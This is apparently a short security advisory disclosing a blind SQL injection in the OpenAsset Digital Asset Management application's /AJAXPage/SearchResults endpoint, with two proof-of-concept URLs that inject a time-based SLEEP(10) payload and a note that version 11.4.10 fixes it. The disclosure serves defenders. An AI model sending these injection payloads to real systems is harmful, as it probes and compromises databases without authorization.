1. Vulnerability Description

 

The OpenAsset Digital Asset Management application was vulnerable to a blind SQL injection, through the /AJAXPage/SearchResults endpoint, via the "currentSearchItems" parameter.

 

2. PoC

 

The following requests will result in > 10 second delay in the response, due to the introduction of the SLEEP(10) command into the SQL query:

 

https://example.com/AJAXPage/SearchResults?currentSearchItems=newUpload:0=11)%20AND%20(SELECT%20SLEEP(10))=1%23

https://example.com/AJAXPage/SearchResults?currentSearchItems=album%3A1=196)%20AND%20(SELECT+SLEEP(10)=1)%23

 

 

3. Solution

 

The vendor provides an updated version (11.4.10) which should be installed immediately. If using the cloud version, the vendor has already updated it.
